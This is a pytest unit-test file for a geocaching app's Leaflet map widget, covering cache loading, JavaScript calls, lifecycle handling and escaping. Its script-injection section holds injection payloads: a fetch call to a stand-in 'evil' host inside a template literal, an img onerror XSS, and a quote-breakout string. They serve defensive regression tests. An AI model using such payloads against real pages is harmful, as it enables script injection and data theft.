# tests/unit-tests/test_map_widget.py — Leaflet map widget (headless mode).

import json
from types import SimpleNamespace

import pytest

pytest.importorskip("pytestqt")

from opensak.gui import map_widget as mw_mod
from opensak.gui.map_widget import MapBridge, MapWidget, TileInterceptor, _cache_pin_html


# ── fakes / helpers ───────────────────────────────────────────────────────────

class FakePage:
    # Records runJavaScript / setHtml; fires JS callbacks as if Leaflet is up.

    def __init__(self):
        self.js = []
        self.html = None

    def runJavaScript(self, js, cb=None):
        self.js.append(js)
        if cb is not None:
            cb(True)

    def setHtml(self, html, url=None):
        self.html = html


def _note(corrected=False):
    return SimpleNamespace(is_corrected=corrected, corrected_lat=55.1, corrected_lon=12.1)


def _cache(**kw):
    d = dict(gc_code="GC1", name="Name", cache_type="Traditional Cache",
             difficulty=1.5, terrain=2.0, latitude=55.0, longitude=12.0,
             found=False, dnf=False, user_note=None)
    d.update(kw)
    return SimpleNamespace(**d)


@pytest.fixture
def fake_settings(monkeypatch):
    s = SimpleNamespace(home_lat=55.0, home_lon=12.0, active_home_name="Home")
    monkeypatch.setattr("opensak.gui.settings.get_settings", lambda: s)
    return s


# ── TileInterceptor ───────────────────────────────────────────────────────────

class TestTileInterceptor:
    def test_sets_referer_for_osm(self):
        captured = []

        class Info:
            def requestUrl(self):
                return SimpleNamespace(
                    toString=lambda: "https://tile.openstreetmap.org/1/2/3.png")

            def setHttpHeader(self, k, v):
                captured.append((k, v))

        TileInterceptor().interceptRequest(Info())
        assert captured == [(b"Referer", b"https://www.openstreetmap.org/")]

    def test_ignores_other_urls(self):
        captured = []

        class Info:
            def requestUrl(self):
                return SimpleNamespace(toString=lambda: "https://example.com/x.png")

            def setHttpHeader(self, k, v):
                captured.append((k, v))

        TileInterceptor().interceptRequest(Info())
        assert captured == []


# ── module helpers ────────────────────────────────────────────────────────────

def test_cache_pin_html():
    html = _cache_pin_html("Traditional Cache", False)
    assert "data:image/svg+xml;base64," in html


# ── MapBridge ─────────────────────────────────────────────────────────────────

def test_bridge_emits(qapp):
    bridge = MapBridge()
    got = []
    bridge.cache_clicked.connect(got.append)
    bridge.on_cache_clicked("GC123")
    assert got == ["GC123"]


# ── MapWidget headless construction ───────────────────────────────────────────

class TestConstruction:
    def test_headless_no_webengine(self, qtbot):
        w = MapWidget()
        qtbot.addWidget(w)
        assert w._page is None
        assert w.is_ready() is False

    def test_bridge_wired_to_signal(self, qtbot):
        w = MapWidget()
        qtbot.addWidget(w)
        got = []
        w.cache_selected.connect(got.append)
        w._bridge.on_cache_clicked("GC9")
        assert got == ["GC9"]

    def test_run_js_noop_when_headless(self, qtbot):
        w = MapWidget()
        qtbot.addWidget(w)
        w._run_js("doStuff()")  # no page → no crash


# ── load_caches / _do_load_caches ─────────────────────────────────────────────

class TestLoadCaches:
    @pytest.fixture
    def w(self, qtbot):
        widget = MapWidget()
        qtbot.addWidget(widget)
        return widget

    def test_not_ready_defers(self, w):
        caches = [_cache()]
        w.load_caches(caches)
        assert w._pending_caches == caches
        assert w._caches == caches

    def test_ready_loads_immediately(self, w):
        w._ready = True
        w._page = FakePage()
        w.load_caches([_cache()])
        assert w._pending_caches is None
        assert any("loadCaches" in js for js in w._page.js)

    def test_do_load_skips_missing_coords_and_handles_corrected(self, w):
        w._page = FakePage()
        caches = [
            _cache(gc_code="GC_NONE", latitude=None),
            _cache(gc_code="GC_OK", found=True, user_note=_note(corrected=True)),
        ]
        w._do_load_caches(caches)
        assert any("GC_OK" in js for js in w._page.js)
        assert all("GC_NONE" not in js for js in w._page.js)


# ── LightweightCache compatibility (#627 beta.11) ─────────────────────────────
#
# TestLoadCaches above uses SimpleNamespace fakes — proving _do_load_caches()
# is duck-typed, but not that a real LightweightCache (from
# apply_filters_lightweight()) actually satisfies that duck type end to end.
# These tests run the real query engine against a real (temp) SQLite
# database and feed genuine LightweightCache rows into the map widget, with
# no source changes to map_widget.py needed — confirming what the #627
# beta.10/11 compatibility audit found.

class TestLoadCachesWithRealLightweightCache:
    @pytest.fixture
    def w(self, qtbot):
        widget = MapWidget()
        qtbot.addWidget(widget)
        widget._ready = True
        widget._page = FakePage()
        return widget

    def _lightweight_caches(self, tmp_db, **cache_kwargs):
        from opensak.db.database import get_session
        from opensak.db.models import Cache, UserNote
        from opensak.filters.engine import apply_filters_lightweight

        defaults = dict(gc_code="GCLW001", name="Lightweight Test",
                         cache_type="Traditional Cache",
                         latitude=55.0, longitude=12.0, found=False, dnf=False)
        defaults.update(cache_kwargs)
        with get_session() as s:
            s.add(Cache(**defaults))
        with get_session() as s:
            return apply_filters_lightweight(s)

    def test_real_lightweight_cache_renders_on_map(self, w, tmp_db):
        caches = self._lightweight_caches(tmp_db)
        from opensak.filters.engine import LightweightCache
        assert isinstance(caches[0], LightweightCache)
        w._do_load_caches(caches)
        assert any("GCLW001" in js for js in w._page.js)

    def test_real_lightweight_cache_with_corrected_coords(self, w, tmp_db):
        from opensak.db.database import get_session
        from opensak.db.models import Cache, UserNote
        from opensak.filters.engine import apply_filters_lightweight

        with get_session() as s:
            c = Cache(gc_code="GCLW002", name="Corrected", cache_type="Unknown Cache",
                       latitude=55.0, longitude=12.0, found=False, dnf=False)
            s.add(c)
            s.flush()
            s.add(UserNote(cache_id=c.id, is_corrected=True,
                            corrected_lat=56.5, corrected_lon=13.5))

        with get_session() as s:
            caches = apply_filters_lightweight(s)

        w._do_load_caches(caches)
        js = next(j for j in w._page.js if "GCLW002" in j)
        assert "56.5" in js
        assert "13.5" in js

    def test_real_lightweight_cache_found_and_dnf_flags(self, w, tmp_db):
        caches = self._lightweight_caches(tmp_db, gc_code="GCLW003", found=True)
        w._do_load_caches(caches)
        assert any("GCLW003" in js for js in w._page.js)

    def test_real_lightweight_cache_missing_coords_skipped(self, w, tmp_db):
        # Cache.latitude/longitude are NOT NULL on the model, so this exercises
        # the same "no coords" skip path via a cache with default (0,0) coords
        # is out of scope here — covered already by the SimpleNamespace test
        # above. This test instead confirms a normal lightweight row with
        # valid coords is never accidentally skipped.
        caches = self._lightweight_caches(tmp_db, gc_code="GCLW004")
        w._do_load_caches(caches)
        assert any("GCLW004" in js for js in w._page.js)

    def test_load_caches_public_api_accepts_lightweight_rows(self, w, tmp_db):
        # load_caches() (not _do_load_caches()) is what mainwindow.py
        # actually calls — confirm the public entry point works too.
        caches = self._lightweight_caches(tmp_db, gc_code="GCLW005")
        w.load_caches(caches)
        assert any("GCLW005" in js for js in w._page.js)


# ── loadCaches() JS: bulk marker loading (issue #630) ─────────────────────────

class TestLoadCachesJsBulkLoading:
    # Issue #630: loadCaches() previously called clusterGroup.addLayer(marker)
    # once per cache inside the forEach loop. Leaflet.markercluster rebuilds
    # its spatial index on every single addLayer() call, which is dramatically
    # slower than the library's own bulk addLayers() API at large marker
    # counts (250k+ caches) — and without chunkedLoading, even the bulk call
    # blocks the browser's UI thread in one go.

    def _load_caches_body(self):
        start = mw_mod.MAP_HTML.index("function loadCaches")
        end = mw_mod.MAP_HTML.index("\nfunction afterCachesLoaded", start)
        return mw_mod.MAP_HTML[start:end]

    def test_uses_bulk_addLayers_not_per_marker_addLayer(self):
        body = self._load_caches_body()
        assert "clusterGroup.addLayers(markerArray)" in body
        # The forEach loop must build the array, not call addLayer() per marker.
        assert "clusterGroup.addLayer(marker)" not in body

    def test_marker_cluster_groups_use_chunked_loading(self):
        # Both the module-level initial group and the one recreated inside
        # loadCaches() need chunkedLoading, since loadCaches() always
        # replaces the group before the bulk addLayers() call.
        assert mw_mod.MAP_HTML.count("chunkedLoading: true") == 2

    def test_pan_fit_bounds_deferred_to_chunk_completion(self):
        # The post-load pan/fitBounds step must run from chunkProgress once
        # every chunk has been processed, not synchronously right after
        # addLayers() — chunked loading adds markers to the map in the
        # background, so an immediate getBounds() call would miss markers
        # from chunks that haven't been processed yet.
        body = self._load_caches_body()
        assert "chunkProgress: function(processed, total)" in body
        assert "afterCachesLoaded()" in body
        # The old synchronous pan/fitBounds logic must not still run inline
        # right after the marker loop.
        addlayers_pos = body.index("clusterGroup.addLayers(markerArray)")
        assert "map.fitBounds(bounds" not in body[addlayers_pos:]

    def test_empty_cache_list_still_runs_after_load_hook(self):
        # chunkProgress never fires for an empty array (addLayers([]) has
        # nothing to chunk), so the empty case must call the after-load hook
        # directly or a stale/empty database would never pan to home.
        body = self._load_caches_body()
        assert "afterCachesLoaded();" in body
        assert "markerArray.length > 0" in body


class TestJsMethods:

    @pytest.fixture
    def w(self, qtbot, fake_settings):
        widget = MapWidget()
        qtbot.addWidget(widget)
        widget._ready = True
        widget._page = FakePage()
        return widget

    def test_pan_to_cache(self, w):
        w.pan_to_cache("GC'1")
        assert any("panToCache" in js for js in w._page.js)

    def test_pan_to_cache_js_has_stale_callback_guard(self):
        # Issue #718 (Mike, Mac ARM beta.7): the map pin sometimes didn't
        # pan/pop up when a new cache was selected, ~60% of the time.
        # Root cause: Leaflet.markercluster's zoomToShowLayer() callback can
        # silently be dropped when panToCache() is called again (a new
        # selection) before the previous call's moveend/zoomend listener has
        # fired. Two safeguards are required: a sequence token so a stale
        # callback can't move the map to the wrong (old) cache, and a
        # setTimeout fallback for when the callback never fires at all.
        start = mw_mod.MAP_HTML.index("function panToCache")
        end = mw_mod.MAP_HTML.index("\nfunction selectMarker", start)
        body = mw_mod.MAP_HTML[start:end]
        assert "panRequestSeq" in body
        assert "mySeq !== panRequestSeq" in body
        assert "setTimeout(doPan" in body

    def test_fit_all(self, w):
        w.fit_all()
        assert w._page.js == ["fitAllMarkers()"]

    def test_update_cache(self, w):
        w.update_cache(_cache(user_note=_note(corrected=True)))
        assert any("updateCacheMarker" in js for js in w._page.js)

    def test_update_cache_marker_reveals_from_cluster(self):
        # Issue #474: a plain map.panTo() inside updateCacheMarker left the
        # pin invisible if the (possibly far-away) new corrected location
        # fell inside an unopened cluster. updateCacheMarker() must reuse
        # panToCache()'s clusterGroup.zoomToShowLayer() reveal instead of a
        # bare map.panTo(), so a far-away corrected location is actually
        # brought into view — same as when selecting a cache in the table.
        start = mw_mod.MAP_HTML.index("function updateCacheMarker")
        end = mw_mod.MAP_HTML.index("\n}", start)
        body = mw_mod.MAP_HTML[start:end]
        assert "panToCache(c.gc_code)" in body
        assert "map.panTo([lat, lon])" not in body

    def test_pan_to_location(self, w):
        w.pan_to_location(1.0, 2.0, "Spot")
        assert any("setHomeLocation" in js for js in w._page.js)
        assert any("panToHome" in js for js in w._page.js)

    def test_pan_to_home(self, w):
        w.pan_to_home()
        assert w._page.js == ["panToHome()"]

    def test_update_home(self, w):
        w.update_home()
        assert any("setHomeLocation" in js for js in w._page.js)

    def test_show_waypoint_markers(self, w):
        import json
        wps = json.dumps([{"lat": 55.1, "lon": 12.1, "prefix": "PK", "wp_type": "Parking", "name": "P"}])
        w.show_waypoint_markers(wps)
        assert any("showWaypointMarkers" in js for js in w._page.js)

    def test_show_waypoint_markers_skips_zero_zero_coords(self):
        # Issue #546: hidden-coordinate waypoints (e.g. finales after a GSAK
        # import) come through as lat=0/lon=0 — a marker at null-island must
        # never be created, or fitBounds() would zoom out to show the whole
        # world instead of the cache's actual waypoints.
        start = mw_mod.MAP_HTML.index("function showWaypointMarkers")
        end = mw_mod.MAP_HTML.index("\n}", start)
        body = mw_mod.MAP_HTML[start:end]
        assert "if (!wp.lat || !wp.lon) return;" in body
        # ...and that the skip happens before any marker is built/added.
        skip_pos = body.index("if (!wp.lat || !wp.lon) return;")
        marker_pos = body.index("L.marker([wp.lat, wp.lon]")
        assert skip_pos < marker_pos

    def test_clear_waypoint_markers(self, w):
        w.clear_waypoint_markers()
        assert w._page.js == ["clearWaypointMarkers()"]

    def test_waypoint_methods_noop_when_not_ready(self, qtbot):
        # Regression for #393: waypoint marker methods no-op before map is loaded.
        widget = MapWidget()
        qtbot.addWidget(widget)
        widget._page = FakePage()
        widget.show_waypoint_markers("[]")
        widget.clear_waypoint_markers()
        assert widget._page.js == []

    def test_methods_noop_when_not_ready(self, qtbot):
        widget = MapWidget()
        qtbot.addWidget(widget)
        widget._page = FakePage()  # but _ready stays False
        widget.pan_to_cache("GC1")
        widget.fit_all()
        widget.update_cache(_cache())
        widget.pan_to_home()
        assert widget._page.js == []


# ── lifecycle: load finished / leaflet ready / reload / cleanup ────────────────

class TestLifecycle:
    @pytest.fixture
    def w(self, qtbot, fake_settings):
        widget = MapWidget()
        qtbot.addWidget(widget)
        return widget

    def test_on_load_finished_not_ok(self, w):
        w._page = FakePage()
        w._on_load_finished(False)
        assert w._page.js == []

    def test_on_load_finished_drives_ready(self, w):
        w._page = FakePage()
        pending = []
        w._pending_caches = [_cache()]
        w._pending_refresh = lambda: pending.append("refreshed")
        w._on_load_finished(True)
        assert w._ready is True
        assert pending == ["refreshed"]
        assert w._pending_caches is None

    def test_on_leaflet_ready_false(self, w):
        w._page = FakePage()
        w._on_leaflet_ready(False)
        assert w._ready is False

    def test_on_leaflet_ready_already_ready(self, w):
        w._page = FakePage()
        w._ready = True
        w._on_leaflet_ready(True)  # returns early, no crash

    def test_reload_map_headless_returns(self, w):
        cb = lambda: None
        w.reload_map(cb)  # page is None
        assert w._pending_refresh is cb

    def test_reload_map_with_page(self, w):
        w._page = FakePage()
        w._ready = True
        w.reload_map()
        assert w._ready is False
        assert w._page.html is not None

    def test_set_pending_refresh(self, w):
        cb = lambda: None
        w.set_pending_refresh(cb)
        assert w._pending_refresh is cb


class TestProductionSetup:
    # Cover the real-WebEngine wiring without spawning Chromium.

    def test_setup_with_fake_webengine(self, qtbot, fake_settings, monkeypatch):
        from PySide6.QtWidgets import QWidget

        class FakeView(QWidget):
            def setPage(self, p):
                self._p = p

        class FakeProfile:
            def setUrlRequestInterceptor(self, i):
                self.i = i

        class FakeProdPage:
            def __init__(self, profile=None):
                self.loadFinished = SimpleNamespace(connect=lambda cb: None)
                self.html = None

            def setWebChannel(self, c):
                self.channel = c

            def setHtml(self, html, url=None):
                self.html = html

            def runJavaScript(self, *a, **k):
                pass

        class FakeChannel:
            def registerObject(self, name, obj):
                self.obj = obj

        monkeypatch.setattr("opensak.gui._headless.webengine_disabled", lambda: False)
        monkeypatch.setattr(mw_mod, "QWebEngineProfile", FakeProfile)
        monkeypatch.setattr(mw_mod, "QWebEnginePage", FakeProdPage)
        monkeypatch.setattr(mw_mod, "QWebEngineView", FakeView)
        monkeypatch.setattr(mw_mod, "QWebChannel", FakeChannel)

        w = MapWidget()
        qtbot.addWidget(w)
        assert w._page is not None
        assert isinstance(w._view, FakeView)
        assert w._page.html is not None  # setHtml was called


class TestCleanup:
    def test_cleanup_headless_noop(self, qtbot):
        w = MapWidget()
        qtbot.addWidget(w)
        w._cleanup_webengine()  # page None → early return
        assert w._cleaned is False

    def test_cleanup_deletes_page_then_profile(self, qtbot):
        w = MapWidget()
        qtbot.addWidget(w)
        order = []
        w._page = SimpleNamespace(deleteLater=lambda: order.append("page"))
        w._profile = SimpleNamespace(deleteLater=lambda: order.append("profile"))
        w._view = SimpleNamespace(setPage=lambda p: order.append(("setPage", p)))
        w._cleanup_webengine()
        assert w._cleaned is True
        assert order == [("setPage", None), "page", "profile"]

    def test_cleanup_idempotent(self, qtbot):
        w = MapWidget()
        qtbot.addWidget(w)
        w._page = SimpleNamespace(deleteLater=lambda: None)
        w._profile = SimpleNamespace(deleteLater=lambda: None)
        w._view = SimpleNamespace(setPage=lambda p: None)
        w._cleanup_webengine()
        w._cleanup_webengine()  # second call short-circuits
        assert w._cleaned is True

    def test_cleanup_swallows_runtime_error(self, qtbot):
        w = MapWidget()
        qtbot.addWidget(w)

        def boom(p):
            raise RuntimeError("deleted")

        w._page = SimpleNamespace(deleteLater=lambda: None)
        w._profile = SimpleNamespace(deleteLater=lambda: None)
        w._view = SimpleNamespace(setPage=boom)
        w._cleanup_webengine()  # RuntimeError caught
        assert w._cleaned is True


# ── show_nearby_for_selection() (issue #718) ──────────────────────────────────
#
# Split-screen map: when a cache is selected, mainwindow.py replaces the
# currently-loaded marker set with just that cache's neighbourhood (from
# get_nearby_caches(), filters/engine.py) instead of relying on whatever the
# overview map happened to have loaded — the root cause of #718 was exactly
# that reuse: a selected cache outside the overview's capped/sorted dataset
# got no map update at all, or the wrong one.

class TestShowNearbyForSelection:
    @pytest.fixture
    def w(self, qtbot, fake_settings):
        widget = MapWidget()
        qtbot.addWidget(widget)
        widget._ready = True
        widget._page = FakePage()
        return widget

    def test_happy_path_calls_loadNearbyCaches(self, w):
        selected = _cache(gc_code="GCSEL", latitude=51.5074, longitude=-0.1278)
        neighbours = [selected, _cache(gc_code="GCNBR", latitude=51.51, longitude=-0.13)]
        w.show_nearby_for_selection(selected, neighbours, 2.0, "")
        js = next(j for j in w._page.js if "loadNearbyCaches" in j)
        assert "GCSEL" in js and "GCNBR" in js
        assert "51.5074" in js and "-0.1278" in js
        assert '"GCSEL"' in js   # centre gc_code arg, a JSON string literal like pan_to_cache
        assert "2.0" in js

    def test_label_text_forwarded_verbatim(self, w):
        selected = _cache(gc_code="GCSEL")
        w.show_nearby_for_selection(selected, [selected], 2.0, "Showing nearest 5 of 40 within 2 km")
        js = next(j for j in w._page.js if "loadNearbyCaches" in j)
        assert "Showing nearest 5 of 40 within 2 km" in js

    def test_empty_label_forwarded_as_empty_json_string(self, w):
        # Empty string means "cap not reached" — the caller (mainwindow's
        # _build_nearby_label) decides this; show_nearby_for_selection just
        # forwards it, and the JS side treats a falsy value as "no label".
        selected = _cache(gc_code="GCSEL")
        w.show_nearby_for_selection(selected, [selected], 2.0, "")
        js = next(j for j in w._page.js if "loadNearbyCaches" in j)
        assert ', ""' in js or ",\"\"" in js.replace(" ", "")

    def test_gc_code_is_passed_as_json_literal(self, w):
        # A backslash used to defeat the old "'" -> "\\'" escaping.
        evil = "GC\\');alert(1)//"
        selected = _cache(gc_code=evil)
        w.show_nearby_for_selection(selected, [selected], 2.0, "")
        js = next(j for j in w._page.js if "loadNearbyCaches" in j)
        assert f", {json.dumps(evil)}, " in js

    def test_noop_when_not_ready(self, qtbot, fake_settings):
        widget = MapWidget()
        qtbot.addWidget(widget)
        widget._page = FakePage()  # _ready stays False
        selected = _cache(gc_code="GCSEL")
        widget.show_nearby_for_selection(selected, [selected], 2.0, "")
        assert widget._page.js == []

    def test_noop_when_selected_cache_missing_coords(self, w):
        selected = _cache(gc_code="GCSEL", latitude=None)
        w.show_nearby_for_selection(selected, [selected], 2.0, "")
        assert w._page.js == []

    def test_neighbours_missing_coords_are_skipped_not_erroring(self, w):
        # Same guard as _do_load_caches — a neighbour without coordinates
        # (shouldn't happen from get_nearby_caches, but duck-typed callers
        # could pass anything) must be silently skipped, not raise.
        selected = _cache(gc_code="GCSEL")
        bad = _cache(gc_code="GCBAD", latitude=None)
        w.show_nearby_for_selection(selected, [selected, bad], 2.0, "")
        js = next(j for j in w._page.js if "loadNearbyCaches" in j)
        assert "GCSEL" in js
        assert "GCBAD" not in js


# ── loadNearbyCaches() / circle / label JS (issue #718) ───────────────────────

class TestNearbyOverlayJs:
    def _fn_body(self, fn_name: str, next_fn_name: str) -> str:
        start = mw_mod.MAP_HTML.index(f"function {fn_name}")
        end = mw_mod.MAP_HTML.index(f"\nfunction {next_fn_name}", start)
        return mw_mod.MAP_HTML[start:end]

    def test_loadCaches_clears_nearby_overlay_first(self):
        # Any call to the general load path (filter change, table refresh)
        # must reset leftover circle/label from a previous nearby-selection —
        # see show_nearby_for_selection()'s docstring.
        body = self._fn_body("loadCaches", "afterCachesLoaded")
        assert "clearNearbyOverlay();" in body
        assert body.index("clearNearbyOverlay();") < body.index("caches.forEach")

    def test_loadNearbyCaches_composes_expected_calls(self):
        body = self._fn_body("loadNearbyCaches", "drawNearbyCircle")
        assert "loadCaches(caches);" in body
        assert "drawNearbyCircle(centerLat, centerLon, radiusKm);" in body
        assert "updateNearbyLabel(labelText);" in body
        assert "panToCache(gcCode);" in body

    def test_drawNearbyCircle_uses_metres_and_skips_nonpositive_radius(self):
        body = self._fn_body("drawNearbyCircle", "clearNearbyCircle")
        assert "radiusKm * 1000" in body
        assert "if (!(radiusKm > 0)) return;" in body

    def test_updateNearbyLabel_hides_when_empty(self):
        body = self._fn_body("updateNearbyLabel", "clearNearbyLabel")
        assert "if (!labelText) return;" in body

    def test_clearNearbyOverlay_clears_both_circle_and_label(self):
        body = self._fn_body("clearNearbyOverlay", "fitAllMarkers")
        assert "clearNearbyCircle();" in body
        assert "clearNearbyLabel();" in body


# ── Script injection from imported cache data ─────────────────────────────────
#
# Cache/waypoint names are written by cache owners and arrive via GPX/GSAK
# imports. They used to be spliced into a JS template literal (only "\" and
# "`" escaped, so "${...}" still ran) and into Leaflet popups as raw HTML.

EVIL = "${fetch('https://evil/?d='+1)}`<img src=x onerror=alert(1)>\\"


def _js_call_arg(js: str, fn: str):
    """Parse the single JSON argument of a recorded `fn(<json>)` call."""
    assert js.startswith(fn + "(") and js.endswith(")")
    return json.loads(js[len(fn) + 1:-1])


class TestScriptInjection:
    @pytest.fixture
    def w(self, qtbot, fake_settings):
        widget = MapWidget()
        qtbot.addWidget(widget)
        widget._ready = True
        widget._page = FakePage()
        return widget

    @staticmethod
    def _fn_body(fn_name: str, end_marker: str) -> str:
        start = mw_mod.MAP_HTML.index(f"function {fn_name}")
        return mw_mod.MAP_HTML[start:mw_mod.MAP_HTML.index(end_marker, start)]

    def test_load_caches_passes_plain_json_argument(self, w):
        w.load_caches([_cache(name=EVIL)])
        js = next(j for j in w._page.js if j.startswith("loadCaches("))
        assert _js_call_arg(js, "loadCaches")[0]["name"] == EVIL

    def test_update_cache_passes_plain_json_argument(self, w):
        w.update_cache(_cache(name=EVIL))
        js = next(j for j in w._page.js if j.startswith("updateCacheMarker("))
        assert _js_call_arg(js, "updateCacheMarker")["name"] == EVIL

    def test_waypoints_pass_plain_json_argument(self, w):
        wps = [{"lat": 55.1, "lon": 12.1, "prefix": EVIL, "wp_type": EVIL, "name": EVIL}]
        w.show_waypoint_markers(json.dumps(wps))
        js = next(j for j in w._page.js if j.startswith("showWaypointMarkers("))
        assert _js_call_arg(js, "showWaypointMarkers") == wps

    def test_pan_to_cache_passes_plain_json_argument(self, w):
        evil = "GC\\');alert(1)//"
        w.pan_to_cache(evil)
        assert _js_call_arg(w._page.js[-1], "panToCache") == evil

    def test_home_label_passes_plain_json_argument(self, w):
        w.pan_to_location(1.0, 2.0, EVIL)
        js = next(j for j in w._page.js if j.startswith("setHomeLocation("))
        assert js.endswith(f", {json.dumps(EVIL, ensure_ascii=False)})")

    def test_js_takes_data_arguments_not_strings_to_parse(self):
        assert "JSON.parse" not in mw_mod.MAP_HTML

    def test_escape_html_covers_markup_characters(self):
        body = self._fn_body("escapeHtml", "\n}")
        for entity in ("&amp;", "&lt;", "&gt;", "&quot;", "&#39;"):
            assert entity in body

    def test_cache_popup_escapes_imported_fields(self):
        body = self._fn_body("cachePopupHtml", "\n}")
        for field in ("gc_code", "name", "cache_type", "corrected_label"):
            assert f"escapeHtml(c.{field})" in body

    def test_cache_popups_use_shared_escaped_builder(self):
        for fn, end in (("loadCaches", "\nfunction afterCachesLoaded"),
                        ("updateCacheMarker", "</script>")):
            assert "marker.bindPopup(cachePopupHtml(c));" in self._fn_body(fn, end)

    def test_waypoint_marker_and_popup_escape_imported_fields(self):
        body = self._fn_body("showWaypointMarkers", "\nfunction updateCacheMarker")
        assert "escapeHtml(wp.prefix)" in body
        assert "escapeHtml(wp.wp_type)" in body
        assert "escapeHtml(wp.name)" in body
        # Only the plain-text marker title (set as an attribute) may use raw values.
        html_lines = [l for l in body.splitlines() if "html:" in l or "var popup" in l]
        assert html_lines and not any("+ wp." in l for l in html_lines)

    def test_home_popup_escapes_label(self):
        body = self._fn_body("setHomeLocation", "\n}")
        assert "escapeHtml(label)" in body
